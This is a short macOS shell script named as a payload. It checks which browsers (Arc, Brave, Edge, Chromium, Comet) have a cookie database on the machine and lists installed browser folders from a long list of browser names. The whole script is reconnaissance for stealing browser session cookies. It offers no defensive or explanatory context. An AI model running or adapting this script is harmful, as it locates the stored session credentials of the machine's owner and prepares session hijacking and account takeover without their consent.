payload.cmd:
for b in arc brave edge chromium comet; do
  d=""
  case $b in
    arc) d="$HOME/Library/Application Support/Arc/User Data/Default/Cookies";;
    brave) d="$HOME/Library/Application Support/BraveSoftware/Brave-Browser/Default/Cookies";;
    edge) d="$HOME/Library/Application Support/Microsoft Edge/Default/Cookies";;
    chromium) d="$HOME/Library/Application Support/Chromium/Default/Cookies";;
    comet) d="$HOME/Library/Application Support/Comet/User Data/Default/Cookies";;
  esac
  [ -f "$d" ] && echo "FOUND: $b"
done; ls "$HOME/Library/Application Support/" 2>/dev/null | grep -iE 'chrome|arc|brave|edge|chromium|safari|firefox|comet|dia|orion|vivaldi|opera'
